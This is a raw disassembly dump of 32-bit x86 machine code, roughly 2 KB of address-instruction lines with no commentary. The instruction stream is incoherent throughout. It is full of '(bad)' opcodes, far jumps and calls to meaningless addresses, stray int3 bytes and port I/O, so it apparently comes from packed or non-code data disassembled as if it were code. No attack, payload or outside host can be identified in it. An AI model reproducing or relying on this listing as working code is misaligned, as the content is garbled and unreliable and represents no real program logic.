  4381fe:	jmp    DWORD PTR [ebx+eax*4]
  438201:	add    BYTE PTR [esi],dh
  438203:	mov    bl,0x0
  438205:	inc    ebx
  438206:	mov    dl,0xcb
  438208:	mov    DWORD PTR [ebx-0x4d00ffcd],eax
  43820e:	add    BYTE PTR [ecx+0x0],ah
  438211:	add    BYTE PTR [ebx+0xa9cff6c],dl
  438217:	lods   eax,DWORD PTR ds:[esi]
  438218:	cmp    edi,0x1b
  43821b:	(bad)  
  43821c:	jmp    edx
  43821e:	call   DWORD PTR ds:0xc529ff00
  438224:	add    BYTE PTR ds:0xffff24b7,bh
  43822a:	mov    cl,0x0
  43822c:	int3   
  43822d:	pop    ss
  43822e:	sub    DWORD PTR [ecx-0x2a273400],0x0
  438235:	pop    ebp
  438236:	lds    edi,FWORD PTR [edx-0x3b7c01]
  43823c:	push   edx
  43823e:	(bad)  
  43823f:	dec    esp
  438241:	add    BYTE PTR [esp+ebx*1-0x1],ah
  438245:	das    
  438246:	jmp    0x83:0x5e8300f9
  43824d:	push   cs
  43824e:	int3   
  43824f:	mov    ch,0xff
  438251:	add    al,ch
  438253:	jae    0x438254
  438255:	rol    DWORD PTR [edi],0x2f
  438258:	int3   
  438259:	add    DWORD PTR [eax],0xffffffff
  43825c:	call   FWORD PTR [edi+0x0]
  43825f:	sbb    bh,bh
  438261:	jmp    FWORD PTR [ebp-0xc]
  438264:	call   DWORD PTR [ebx+0x40]
  438267:	fild   WORD PTR [ebx-0xff7d01]
  43826d:	pop    ss
  43826e:	(bad)  
  43826f:	out    dx,eax
  438270:	mov    DWORD PTR [eax],eax
  438272:	mov    BYTE PTR [esi-0x1],bl
  438275:	test   DWORD PTR [edx+0x78],ebp
  438278:	add    bh,bh
  43827a:	retf   
  43827b:	int3   
  43827c:	cmp    DWORD PTR [ecx],0xffffffff
  43827f:	xchg   BYTE PTR [eax],al
  438281:	add    al,ch
  438283:	inc    eax
  438284:	adc    DWORD PTR [ebx],0xffffffc8
  438287:	or     bh,bh
  438289:	jmp    FWORD PTR [edx+0x0]
  43828c:	(bad)  
  43828d:	fld    QWORD PTR [ebx-0x3b0000b1]
  438293:	lock push DWORD PTR [ecx-0x7c00a89f]
  43829a:	dec    esp
  43829b:	(bad)  
  43829c:	call   ebp
  43829e:	mov    DWORD PTR [edx],ecx
  4382a0:	cmp    edi,0x25
  4382a3:	jp     0x4382a5
  4382a5:	jp     0x4382b6
  4382a7:	test   DWORD PTR [ebx+0xffac83],eax
  4382ad:	fadd   DWORD PTR [eax]
  4382af:	addr16 add bh,bh
  4382b2:	mov    esi,0xb019001f
  4382b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4382b8:	add    BYTE PTR [ecx+0x4ff001a],cl
  4382be:	call   DWORD PTR [edi+0x0]
  4382c1:	add    BYTE PTR [eax],al
  4382c3:	stos   DWORD PTR es:[edi],eax
  4382c4:	call   DWORD PTR [ecx-0x7]
  4382c7:	and    al,0xff
  4382c9:	dec    DWORD PTR [eax+eax*1]
  4382cc:	call   FWORD PTR [edi+edi*8]
  4382cf:	xchg   esp,eax
  4382d0:	dec    DWORD PTR [ecx+0x13831877]
  4382d6:	mov    al,0x9e
  4382d8:	(bad)  
  4382d9:	inc    DWORD PTR [edx+0x0]
  4382dc:	int3   
  4382dd:	out    dx,al
  4382de:	add    BYTE PTR [ebp+0x115383ff],dh
  4382e4:	jmp    FWORD PTR [eax+edi*1-0x5e00336c]
  4382eb:	(bad)  
  4382ec:	call   ecx
  4382ee:	jmp    FWORD PTR [eax+0x0]
  4382f1:	inc    DWORD PTR [eax]
  4382f3:	outs   dx,BYTE PTR ds:[esi]
  4382f4:	add    BYTE PTR [ebp-0x6e],bh
  4382f7:	fcos   
  4382f9:	int3   
  4382fa:	arpl   WORD PTR [ebx+0x66ff4400],ax
  438300:	int3   
  438301:	jmp    DWORD PTR [edi]
  438303:	add    edi,edi
  438305:	iret   
  438306:	jge    0x438314
  438308:	add    bh,bh
  43830a:	inc    edx
  43830b:	inc    DWORD PTR [ebx+0xf2834b]
  438311:	sub    DWORD PTR [eax],0x35
  438314:	add    BYTE PTR [eax-0x7f],ah
  438317:	jg     0x438318
  438319:	call   DWORD PTR ds:0xffa98989
  43831f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438320:	add    bh,bh
  438322:	shr    BYTE PTR [eax],1
  438324:	add    ch,dl
  438326:	arpl   dx,sp
  438328:	add    DWORD PTR [ebx+0x3889cc85],0xffffffff
  43832f:	xchg   esi,eax
  438330:	inc    DWORD PTR [ebx-0x5f3335c9]
  438336:	js     0x438375
  438338:	add    bh,bh
  43833a:	sub    edi,edi
  43833c:	call   FWORD PTR [edx-0x7d]
  43833f:	mov    es,WORD PTR [ebx-0x33aca101]
  438345:	shl    ebx,0x8
  438348:	add    BYTE PTR [ebx+0x5900ff8b],al
  43834e:	add    BYTE PTR [edx+0x205f0083],bh
  438354:	add    BYTE PTR [esi+ebp*2],ch
  438357:	pop    ebx
  438358:	add    bh,bh
  43835a:	cmp    edi,edi
  43835c:	inc    DWORD PTR [edi+edi*8+0x57]
  438360:	(bad)  
  438361:	push   DWORD PTR [esi]
  438363:	mov    al,0x0
  438365:	aad    0x9a
  438367:	jecxz  0x438368
  438369:	jmp    FWORD PTR [edx]
  43836b:	add    bh,bh
  43836d:	push   0x83ff91ff
  438372:	and    DWORD PTR [edx],0xba75a200
  438378:	dec    esp
  43837a:	ret    
  43837b:	add    BYTE PTR [eax],al
  43837d:	push   ss
  43837e:	and    ebx,0xffffff83
  438381:	call   DWORD PTR [ebx-0x54]
  438384:	dec    DWORD PTR [ecx]
  438386:	inc    esp
  438387:	mov    dh,0x0
  438389:	jmp    DWORD PTR [ebx-0x1]
  43838c:	inc    DWORD PTR [edi+0x9600]
  438392:	fdivr  DWORD PTR [ecx]
  438394:	add    BYTE PTR [esi],bl
  438396:	out    dx,eax
  438397:	push   edi
  438398:	add    BYTE PTR [ebx-0x1c7cff89],al
  43839e:	dec    esp
  4383a0:	mov    edi,edi
  4383a2:	pop    esi
  4383a3:	lods   al,BYTE PTR ds:[esi]
  4383a4:	jmp    FWORD PTR ds:0x895bc3
  4383aa:	dec    edx
  4383ab:	add    BYTE PTR [eax],al
  4383ad:	(bad)  
  4383ae:	inc    DWORD PTR [ebp-0x7ec50077]
  4383b4:	add    BYTE PTR [edx+0xa57b],bh
  4383ba:	fadd   QWORD PTR [eax]
  4383bc:	add    BYTE PTR [ecx-0x34],dl
  4383bf:	sbb    al,0x0
  4383c1:	(bad)  
  4383c2:	jge    0x4383ac
  4383c4:	jmp    DWORD PTR [eax-0x7cffb319]
  4383ca:	aad    0x83
  4383cc:	or     DWORD PTR [ebx+0xcc5eff],0x79
  4383d3:	stos   DWORD PTR es:[edi],eax
  4383d4:	mov    DWORD PTR [esi-0x7f],edi
  4383d7:	adc    eax,0x8ff00
  4383dc:	int3   
  4383dd:	retf   
  4383de:	mov    DWORD PTR [ecx],edx
  4383e0:	dec    DWORD PTR [ecx+0x4a8333a9]
  4383e6:	jb     0x4383eb
  4383e8:	inc    DWORD PTR [eax]
  4383ea:	dec    ebx
  4383eb:	inc    DWORD PTR [eax]
  4383ed:	outs   dx,DWORD PTR ds:[esi]
  4383ee:	(bad)  
  4383ef:	jmp    0x34d083f4
  4383f4:	sbb    ebx,0xffffffc4
  4383f7:	inc    ebx
  4383f8:	int3   
  4383f9:	int3   
  4383fa:	es add ah,cl
  4383fd:	lds    eax,FWORD PTR [eax]
  4383ff:	fiadd  WORD PTR [eax]
  438401:	(bad)  
  438402:	jmp    0x438436
  438404:	add    BYTE PTR [ebx],bh
  438406:	xchg   DWORD PTR [edx-0x33e30000],esp
  43840c:	inc    DWORD PTR [edi]
  43840e:	add    BYTE PTR [ecx-0x1],cl
  438411:	add    BYTE PTR [ebx+0x19b8ff1b],ch
  438417:	call   0xd200:0xffd0cc00
  43841e:	sub    DWORD PTR [eax-0x474b007d],0xffffffcc
  438425:	sub    DWORD PTR [edx+edi*8-0x1],esi
  438429:	jmp    esi
  43842b:	inc    DWORD PTR [ebx-0x7c937c2c]
  438431:	add    bh,al
  438433:	data16 (bad) 
  438435:	jmp    0x4384b3
  438437:	(bad)  
  438439:	or     DWORD PTR [esi-0x7d],0xffffff83
  43843d:	xor    DWORD PTR [bx+di+0x0],0x0
  438442:	jnp    0x4384c2
  438444:	(bad)  
  438445:	cld    
  438446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438447:	mov    DWORD PTR [ebx-0x4700],0x5836a
  438451:	dec    DWORD PTR [edi]
  438453:	or     DWORD PTR [eax],eax
  438455:	in     eax,dx
  438456:	jle    0x43844d
  438458:	dec    esp
  43845a:	mov    eax,ds:0x8372ffff
  43845f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438460:	add    bh,bh
  438462:	jecxz  0x438468
  438464:	add    esp,0xffffffea
  438467:	cmp    bh,bh
  438469:	dec    ebp
  43846b:	inc    DWORD PTR [eax]
  43846d:	mov    bl,0xff
  43846f:	inc    edx
  438470:	(bad)  
  438471:	jmp    FWORD PTR ds:0xf60ff94
  438477:	cmp    eax,0x8310ffff
  43847c:	int3   
  43847d:	mov    eax,ds:0xffffcdcc
  438482:	mov    bl,0xd
  438484:	jmp    DWORD PTR [eax-0x7c7c7a81]
  43848a:	ins    DWORD PTR es:[edi],dx
  43848b:	dec    esp
  43848d:	rol    BYTE PTR [ebx+0x6383ffe4],0x2f
  438494:	add    BYTE PTR [ebx+0xcc76ff],dh
  43849a:	or     DWORD PTR [eax],eax
  43849c:	add    BYTE PTR [edi+edi*8],ah
  43849f:	je     0x43842a
  4384a1:	sub    DWORD PTR [ebp-0x3d],0xffffffcc
  4384a5:	imul   edi,ebx,0xffffff9d
  4384a8:	add    bh,bh
  4384aa:	in     al,dx
  4384ab:	dec    DWORD PTR [ecx-0x7cc4fff4]
  4384b1:	call   DWORD PTR [edx]
  4384b3:	or     al,0xff
  4384b5:	lods   al,BYTE PTR ds:[esi]
  4384b6:	out    dx,al
  4384b7:	in     al,dx
  4384b8:	inc    DWORD PTR [ebx+0x7affcc29]
  4384be:	mov    DWORD PTR [esi-0x1],edi
  4384c1:	call   FWORD PTR [edi+edi*8-0x3bd8f401]
  4384c8:	int3   
  4384c9:	add    cl,dl
  4384cb:	(bad)  
  4384cc:	dec    DWORD PTR [eax-0x7c1401]
  4384d2:	neg    BYTE PTR [esi-0x7d]
  4384d5:	adc    cl,BYTE PTR [edi]
  4384d7:	push   esp
  4384d8:	add    DWORD PTR [eax],0x79
  4384db:	dec    DWORD PTR [ecx-0x7cadff03]
  4384e1:	add    BYTE PTR [ecx-0x2879ff42],dl
  4384e7:	scas   al,BYTE PTR es:[edi]
  4384e8:	add    BYTE PTR [eax],al
  4384ea:	dec    ecx
  4384eb:	(bad)  
  4384ec:	inc    DWORD PTR [edi+edi*8+0x1189ffb4]
  4384f3:	cdq    
  4384f4:	add    BYTE PTR [ebp+ebp*4-0x4a767c06],bh
  4384fb:	(bad)  
  4384fc:	dec    DWORD PTR [ebp+0xffdeff]
  438502:	cmp    cl,BYTE PTR [ebx]
  438504:	inc    DWORD PTR [edx]
  438506:	aam    0x26
  438508:	cmp    edi,0xffffffd6
  43850b:	add    bh,bh
  43850d:	add    al,0x83
  43850f:	jae    0x4384dd
  438511:	dec    DWORD PTR [esp+edx*1]
  438514:	call   DWORD PTR [edx+0x3]
  438517:	add    DWORD PTR [eax],0xffffff83
  43851a:	sub    edi,edi
  43851c:	call   FWORD PTR [ebp+0x0]
  43851f:	ret    
  438520:	add    bh,bh
  438522:	sub    DWORD PTR [esi-0xca09000],esi
  438528:	cmp    edi,0x1b
  43852b:	add    BYTE PTR [ecx-0x460056],cl
  438531:	mov    DWORD PTR [eax+0x339c00f6],ecx
  438537:	inc    edi
  438538:	add    BYTE PTR [eax],al
  43853a:	stc    
  43853b:	inc    DWORD PTR [ebx+0xbaff22]
  438541:	(bad)  
  438542:	jge    0x43850f
  438544:	dec    DWORD PTR [eax+0x5]
  438547:	rol    DWORD PTR [ebx-0x7c007e01],1
  43854d:	loope  0x43854e
  43854f:	mov    edi,0xf785ffff
  438554:	jmp    DWORD PTR [ecx-0xc]
  438557:	add    edi,edi
  438559:	add    BYTE PTR [ecx-0x39ff7d],ch
  43855f:	or     DWORD PTR cs:[ecx+0x61ccee2b],0xffffffc1
  438567:	add    edi,edi
  438569:	add    BYTE PTR [edi+edi*8-0x1],al
  43856d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43856e:	add    BYTE PTR [ebp+0x780400ff],ch
  438574:	dec    DWORD PTR [esi-0x7c826e]
  43857a:	mov    es,WORD PTR [eax]
  43857c:	or     DWORD PTR [edi+0xff1889],0x73
  438583:	sbb    ecx,esp
  438585:	jns    0x438522
  438587:	or     DWORD PTR [eax],eax
  438589:	add    cl,dl
  43858b:	dec    DWORD PTR [ecx-0x33cfffd2]
  438591:	add    BYTE PTR [ebx+ebp*8-0x5b423b7d],ch
  438598:	(bad)  
  438599:	inc    DWORD PTR [edx+0x230089]
  43859f:	cdq    
  4385a0:	add    bh,bh
  4385a2:	mov    dh,0xe5
  4385a4:	call   FWORD PTR [edx-0x36df]
  4385aa:	clc    
  4385ab:	add    bh,bh
  4385ad:	mov    bh,0x83
  4385af:	and    edi,edi
  4385b1:	inc    DWORD PTR [edi]
  4385b3:	imul   edi,edi,0xff5fa2d3
  4385b9:	add    BYTE PTR [edi+0x66ffcc],bl
  4385bf:	dec    ebp
  4385c0:	cmp    edi,0xffffff9e
  4385c3:	stos   DWORD PTR es:[edi],eax
  4385c4:	add    DWORD PTR [ebp-0x7600c5dd],0x4c
  4385cb:	int3   
  4385cc:	jmp    DWORD PTR [esi-0x1]
  4385cf:	cmp    al,0x83
  4385d1:	xor    DWORD PTR [ebx],0x1f
  4385d4:	(bad)  
  4385d5:	cmp    al,0x34
  4385d7:	cmp    edi,0x83ff35ff
  4385dd:	or     al,BYTE PTR [ebx+0x11ff009e]
  4385e3:	ss call ebx
  4385e6:	repnz (bad) 
  4385e8:	(bad)  
  4385e9:	inc    edx
  4385eb:	or     DWORD PTR [ecx-0x7c4900b8],0xffffffcc
  4385f2:	in     al,0xa2
  4385f4:	add    bl,dh
  4385f6:	(bad)
  4385fa:	adc    eax,0x83cd00ff
  4385ff:	dec    esi
  438600:	add    BYTE PTR [eax],al
  438602:	pop    ebx
  438603:	(bad)  
  438604:	push   DWORD PTR ds:0x83cc0337
  43860a:	sbb    edi,edi
  43860c:	jmp    DWORD PTR [ecx+ecx*4-0x6bffff9d]
  438613:	test   BYTE PTR [eax],al
  438615:	lahf   
  438616:	and    DWORD PTR [esi],0x0
  438619:	add    BYTE PTR [ebx],al
  43861b:	add    ah,cl
  43861d:	lods   eax,DWORD PTR ds:[esi]
  43861e:	sub    ebx,0xffffffff
  438621:	add    BYTE PTR [ebp-0x71],cl
  438624:	add    bh,bl
  438626:	mov    esp,0x7489cc54
  43862b:	add    DWORD PTR [eax],0xffffffdd
  43862e:	add    BYTE PTR [esi],dh
  438630:	add    BYTE PTR [eax],al
  438632:	popf   
  438633:	fcos   
  438635:	repz jb 0x438628
  438638:	(bad)  
  438639:	jmp    FWORD PTR [edx-0x1]
  43863c:	add    ah,dh
  43863e:	add    BYTE PTR [edx+0x0],ch
  438641:	dec    DWORD PTR [edi+0x73]
  438644:	add    bl,bh
  438646:	inc    ebp
  438647:	xchg   edi,edi
  438649:	add    cl,bh
  43864b:	(bad)  
  43864c:	jmp    FWORD PTR [ecx-0x1900]
  438652:	push   ebx
  438653:	xchg   esi,eax
  438654:	add    BYTE PTR [edx+0x4a],dl
  438657:	and    DWORD PTR [ebx+0xd800],eax
  43865d:	or     edi,edi
  43865f:	or     BYTE PTR [ecx-0x76d38d00],cl
  438665:	pop    ebp
  438666:	rol    BYTE PTR [edi-0x127c01],0xcc
  43866d:	mov    es,WORD PTR [ebx-0x65007c58]
  438673:	pop    es
  438674:	call   DWORD PTR ds:0x89ff6ed9
  43867a:	jl     0x43867b
  43867c:	add    BYTE PTR [edi-0x1],bl
  43867f:	jo     0x438680
  438681:	and    DWORD PTR [edi],0xffffff88
  438684:	mov    ebp,edx
  438686:	inc    esi
  438687:	mov    bh,bh
  438689:	push   ebx
  43868b:	int3   
  43868c:	jmp    FWORD PTR [eax+eax*1-0x78]
  438690:	add    ah,cl
  438692:	jge    0x4386f1
  438694:	jmp    FWORD PTR [ecx]
  438696:	retf   0xff61
  438699:	push   esp
  43869b:	(bad)  
  43869c:	inc    DWORD PTR [eax-0x76008b01]
  4386a2:	cmp    eax,0xcc0a8379
  4386a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4386a8:	or     esp,0xffffffd1
  4386ab:	inc    DWORD PTR [eax]
  4386ad:	mov    ds:0x89ff63ff,eax
  4386b2:	dec    ebx
  4386b3:	adc    al,0x83
  4386b5:	pusha  
  4386b6:	jp     0x4386aa
  4386b8:	int3   
  4386b9:	inc    DWORD PTR [eax+eax*1+0x0]
  4386bd:	in     al,0xff
  4386bf:	ret    
  4386c0:	(bad)  
  4386c1:	dec    DWORD PTR [esi-0x60]
  4386c4:	push   DWORD PTR [eax+0x8344cf]
  4386ca:	outs   dx,BYTE PTR ds:[esi]
  4386cb:	cmp    edi,0x39
  4386ce:	jmp    DWORD PTR [ebx-0x47310100]
  4386d4:	(bad)  
  4386d5:	call   0xcc43ccb8
  4386da:	(bad)  
  4386db:	(bad)  
  4386dc:	dec    DWORD PTR [ebp+0x0]
  4386df:	loopne 0x4386e0
  4386e1:	mov    edi,eax
  4386e3:	add    DWORD PTR [eax],0xffffffd6
  4386e6:	jb     0x438715
  4386e8:	add    bh,bh
  4386ea:	idiv   bh
  4386ec:	push   DWORD PTR [ebx-0x1]
  4386ef:	enter  0xff83,0x6a
  4386f3:	push   edi
  4386f4:	adc    DWORD PTR [eax-0x29],0x73
  4386f8:	add    bh,bh
  4386fa:	or     al,0x83
  4386fc:	add    BYTE PTR [eax],bh
  4386fe:	push   DWORD PTR [ebx]
  438700:	add    BYTE PTR [eax],al
  438702:	jns    0x4386ff
  438704:	dec    esp
  438706:	loope  0x43873d
  438708:	(bad)  
  438709:	push   DWORD PTR [ecx-0x7c61337d]
  43870f:	ud0    eax,DWORD PTR [ebx+0x70006017]
  438716:	and    bl,BYTE PTR [ebp+0x1389cc]
  43871c:	add    BYTE PTR [edx],cl
  43871e:	inc    eax
  438720:	dec    esp
  438722:	jns    0x4386c5
  438724:	mov    DWORD PTR [ebp-0x1502],edi
  43872a:	mov    al,ds:0x893483cc
  43872f:	or     edi,edi
  438731:	int3   
  438732:	ds inc ebx
  438734:	int3   
  438735:	test   al,0x7e
  438737:	data16 add bh,bh
  43873a:	add    DWORD PTR [eax],0xa400de83
  438740:	add    bh,bh
  438742:	or     eax,0x4d9fffc
  438747:	hlt    
  438748:	add    BYTE PTR [ecx+0x7700ff12],cl
  43874e:	push   DWORD PTR [esi+0x3a08ff00]
  438754:	add    dh,dl
  438756:	ds sbb bh,bh
  438759:	push   DWORD PTR [edx+0xf6ffff]
  43875f:	sub    edi,edi
  438761:	add    BYTE PTR [ecx+0x4276ffd5],dh
  438767:	or     DWORD PTR [eax],eax
  438769:	sbb    DWORD PTR [edx-0x1],0xffffffff
  43876d:	mov    DWORD PTR [ebx+0x1083832e],eax
  438773:	gs (bad) 
  438775:	jnp    0x43879b
  438777:	out    0xcc,al
  438779:	add    BYTE PTR [eax],dh
  43877b:	add    bh,bh
  43877d:	xor    WORD PTR [ebx],0xffff
  438781:	(bad)  
  438782:	jns    0x4387d9
  438784:	add    BYTE PTR [ebx],bh
  438786:	lods   eax,DWORD PTR cs:[esi]
  438788:	add    BYTE PTR [eax],al
  43878a:	inc    edx
  43878b:	(bad)  
  43878c:	call   FWORD PTR [edx]
  43878e:	mov    DWORD PTR [esi-0x1],ebp
  438791:	call   DWORD PTR [ebx+0x705fff85]
  438797:	into   
  438798:	add    BYTE PTR [eax],al
  43879a:	cmp    edi,0x90002700
  4387a0:	dec    esp
  4387a2:	push   esp
  4387a3:	xchg   esi,eax
  4387a4:	(bad)  
  4387a5:	jle    0x43881e
  4387a7:	ds (bad) 
  4387a9:	push   DWORD PTR [ebx+0x3fffff]
  4387af:	xor    eax,DWORD PTR [ebx+0x82cd89]
  4387b5:	push   cs
  4387b6:	test   eax,0xbaffffcc
  4387bb:	add    ah,cl
  4387bd:	mov    ebp,0x89c000
  4387c2:	mov    edx,0x5c3489fa
  4387c7:	push   ds
  4387c8:	add    ah,cl
  4387ca:	cwde   
  4387cb:	inc    DWORD PTR [eax]
  4387cd:	test   edi,edi
  4387cf:	and    bh,bh
  4387d1:	mov    DWORD PTR [edx],ecx
  4387d3:	ins    BYTE PTR es:[edi],dx
  4387d4:	jmp    FWORD PTR [eax+0x53]
  4387d7:	xor    bh,bh
  4387d9:	jmp    FWORD PTR [edi-0x77]
  4387dc:	add    bh,cl
  4387de:	push   edx
  4387e0:	dec    esp
  4387e2:	sar    al,1
  4387e4:	add    ebp,0x3c
  4387e7:	add    BYTE PTR es:[eax],al
  4387ea:	mov    ds:0xffbbff00,al
  4387ef:	out    0xff,al
  4387f1:	sbb    DWORD PTR [esi+ebx*4],0xffffffff
  4387f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4387f6:	mov    edx,0x16ffff66
  4387fb:	add    BYTE PTR [ecx-0x57007e],cl
  438801:	add    BYTE PTR [esi+0xb4fff35],bl
  438807:	ja     0x438808
  438809:	jmp    DWORD PTR [edi+edi*8]
  43880c:	add    BYTE PTR [eax],ah
  43880e:	int3   
  43880f:	xchg   esp,eax
  438810:	int3   
  438811:	jmp    DWORD PTR [ecx-0x22f20058]
  438817:	push   0xff0e8389
  43881c:	add    BYTE PTR [edx],dl
  43881e:	or     DWORD PTR [edi],0x0
  438821:	int3   
  438822:	and    BYTE PTR [edx],cl
  438824:	dec    DWORD PTR [eax+ebp*8+0x30]
  438828:	add    DWORD PTR [ebx-0x3300762a],0x0
  43882f:	rol    DWORD PTR [ebx-0x761c0c01],cl
  438835:	paddusb mm6,QWORD PTR [edi+edi*8-0x7c009f01]
  43883d:	sbb    bh,bh
  43883f:	jnp    0x438840
  438841:	add    BYTE PTR [ebp-0x3b],ch
  438844:	add    BYTE PTR [ebp+0xff17b8],dh
  43884a:	leave  
  43884b:	int3   
  43884c:	add    al,dl
  43884e:	adc    DWORD PTR ds:0x822fff00,0xffffffff
  438855:	(bad)
  438859:	push   DWORD PTR [ecx-0x7d]
  43885c:	add    BYTE PTR [ecx-0x33ffb201],bl
  438862:	fnstenv [ebx]
  438864:	jmp    FWORD PTR [ebx]
  438866:	ror    ch,0xff
  438869:	or     eax,0xffffffcc
  43886c:	add    BYTE PTR [esp+ecx*8-0x2f00ff4a],dl
  438873:	(bad)  
  438874:	call   DWORD PTR [edx+ebp*8]
  438877:	mov    edx,0xffe10000
  43887c:	jmp    DWORD PTR [edx-0x1]
  43887f:	xor    cl,ah
  438881:	add    BYTE PTR [eax+0x32aa00fb],ch
  438887:	idiv   bh
  438889:	call   FWORD PTR [ecx]
  43888b:	add    bh,bh
  43888d:	addr16 add ebx,0xffffffff
  438891:	xor    DWORD PTR [edx],0x1d
  438894:	or     DWORD PTR [ecx],0x1a
  438897:	ins    DWORD PTR es:[edi],dx
  438898:	inc    DWORD PTR [eax]
  43889a:	xchg   ebx,eax
  43889b:	add    bh,bh
  43889d:	retf   
  43889e:	add    BYTE PTR [ebp-0xeea3334],al
  4388a4:	(bad)  
  4388a5:	in     al,dx
  4388a6:	mov    bl,0xfd
  4388a8:	inc    DWORD PTR [ebx-0x4ff0066]
  4388ae:	add    BYTE PTR [edx],bh
  4388b0:	(bad)  
  4388b1:	call   FWORD PTR [edx]
  4388b3:	test   BYTE PTR [eax],al
  4388b5:	push   ebp
  4388b6:	jns    0x438859
  4388b8:	mov    edi,edi
  4388ba:	out    0x83,eax
  4388bc:	add    BYTE PTR [edx+0x0],dh
  4388bf:	lahf   
  4388c0:	add    DWORD PTR [eax],0xffffffaa
  4388c3:	jno    0x4388c5
  4388c5:	inc    eax
  4388c6:	popf   
  4388c7:	jl     0x4388c9
  4388c9:	push   DWORD PTR [edx-0xbe0001]
  4388cf:	out    dx,eax
  4388d0:	(bad)  
  4388d1:	push   DWORD PTR [ebx+0x7f]
  4388d4:	xor    DWORD PTR [edi],0xffffffb0
  4388d7:	pushf  
  4388d8:	add    DWORD PTR [eax],0x41
  4388db:	add    BYTE PTR [eax],al
  4388dd:	mov    edi,edi
  4388df:	or     bh,bh
  4388e1:	int3   
  4388e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4388e3:	inc    DWORD PTR cs:[esi-0x7f]
  4388e7:	hlt    
  4388e8:	add    bh,bh
  4388ea:	xor    al,0x0
  4388ec:	jmp    FWORD PTR [ecx-0x1800]
  4388f2:	(bad)  
  4388f4:	inc    DWORD PTR [esi]
  4388f6:	mov    ch,0xf9
  4388f8:	or     DWORD PTR [ecx-0x7d7cff6f],0xffffff89
  4388ff:	and    edi,edi
  438901:	int3   
  438902:	xor    eax,0xa2f700f3
  438907:	mov    eax,0xff58ff89
  43890c:	add    BYTE PTR [ecx+0xffe0ff],cl
  438912:	add    DWORD PTR [ecx],0xffffff83
  438915:	ret    
  438916:	adc    BYTE PTR [ebx],dl
  438918:	add    bh,bh
  43891a:	push   DWORD PTR [ecx-0x1]
  43891d:	push   eax
  43891e:	adc    edx,eax
  438920:	inc    DWORD PTR [ebx+0x29ff5ecc]
  438926:	add    al,BYTE PTR [ecx]
  438928:	int3   
  438929:	dec    esp
  43892b:	pop    ecx
  43892c:	inc    DWORD PTR [ecx-0x30]
  43892f:	inc    eax
  438930:	cmp    ebx,esp
  438932:	(bad)  
  438933:	inc    DWORD PTR [eax]
  438935:	jmp    FWORD PTR [esi-0x39b4768]
  43893b:	add    bh,bh
  43893d:	call   DWORD PTR [eax+0x0]
  438940:	outs   dx,BYTE PTR ds:[esi]
  438941:	push   esp
  438942:	add    BYTE PTR [ecx-0x7a900100],cl
  438948:	mov    ch,0x17
  43894a:	scas   al,BYTE PTR es:[edi]
  43894b:	add    bh,bh
  43894d:	mov    esp,esp
  43894f:	push   DWORD PTR [ecx-0x5a]
  438955:	adc    DWORD PTR [ecx],0xffffff9e
  438958:	add    BYTE PTR [edi+ebx*1],ch
  43895b:	inc    DWORD PTR [eax]
  43895d:	add    cl,dl
  43895f:	inc    DWORD PTR [eax-0x7c76004e]
  438965:	push   DWORD PTR [edi]
  438967:	dec    ecx
  438968:	cmp    DWORD PTR [ebp+esi*4-0x1],ebp
  43896c:	inc    DWORD PTR [eax]
  43896e:	jmp    0x4388f3
  438970:	mov    WORD PTR [ebx],ds
  438972:	add    BYTE PTR [ecx+0x583cff00],cl
  438978:	adc    DWORD PTR [ecx+0x89003a],edx
  43897e:	scas   al,BYTE PTR es:[edi]
  43897f:	add    BYTE PTR [edi],bl
  438981:	dec    eax
  438982:	add    bh,bh
  438984:	add    bh,bh
  438986:	push   ecx
  438987:	pushf  
  438988:	in     eax,dx
  438989:	je     0x4389e9
  43898b:	inc    DWORD PTR [ebx-0x4dffb200]
  438991:	inc    ebx
  438992:	(bad)  
  438993:	inc    DWORD PTR [eax]
  438995:	add    al,dl
  438997:	adc    ebp,DWORD PTR [ebp+0x68]
  43899a:	jne    0x43899c
  43899c:	add    bh,bh
  43899e:	js     0x43899f
  4389a0:	test   al,0xb3
  4389a2:	add    bh,bh
  4389a4:	add    DWORD PTR [eax],0xffffffae
  4389a7:	inc    edx
  4389a8:	test   al,0x39
  4389aa:	fdiv   st(7),st
  4389ac:	int3   
  4389ad:	int3   
  4389ae:	lods   al,BYTE PTR ds:[esi]
  4389af:	add    DWORD PTR [edi],0x2c
  4389b2:	add    bh,bh
  4389b4:	dec    DWORD PTR [ecx+0x4dc089e2]
  4389ba:	inc    BYTE PTR [eax]
  4389bc:	(bad)  
  4389bd:	call   FWORD PTR [esi+0x0]
  4389c0:	out    dx,al
  4389c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4389c2:	mov    DWORD PTR [ebx+0x43f2ff00],eax
  4389c8:	(bad)  
  4389ca:	sti    
  4389cb:	(bad)  
  4389cc:	(bad)  
  4389cd:	(bad)  
  4389ce:	sti    
  4389cf:	push   DWORD PTR [ebx]
  4389d1:	in     al,dx
  4389d2:	cmp    edi,0xffffffff
  4389d5:	push   DWORD PTR [edi-0x43]
  4389d8:	add    al,BYTE PTR ds:0x8383835d
  4389de:	retf   0xb4ff
  4389e1:	call   0xff438ae5
  4389e6:	rcr    DWORD PTR [edx-0x7cfaeb8c],1
  4389ec:	inc    DWORD PTR [ebx+0x7e68ffbb]
  4389f2:	(bad)  
  4389f3:	(bad)  
  4389f4:	(bad)  
  4389f5:	push   ebp
  4389f7:	cmp    al,0xb3
  4389f9:	sbb    ebp,DWORD PTR [eax]
  4389fb:	int3   
  4389fc:	add    BYTE PTR [eax],al
  4389fe:	mov    ds:0xffd9ba00,al
  438a03:	add    BYTE PTR [eax],al
  438a05:	mov    ebx,edi
  438a07:	sahf   
  438a08:	jbe    0x4389e0
  438a0a:	(bad)  
  438a0b:	inc    DWORD PTR [eax]
  438a0d:	(bad)  
  438a0e:	(bad)  
  438a10:	dec    esp
  438a11:	mov    ecx,0xff8983
  438a16:	pop    ebp
  438a17:	iret   
  438a18:	pop    ebx
  438a19:	(bad)  [edi+edi*8-0xf10001]
  438a20:	inc    ebx
  438a21:	mov    bh,bh
  438a23:	int3   
  438a24:	(bad)  
  438a25:	inc    edx
  438a27:	add    eax,eax
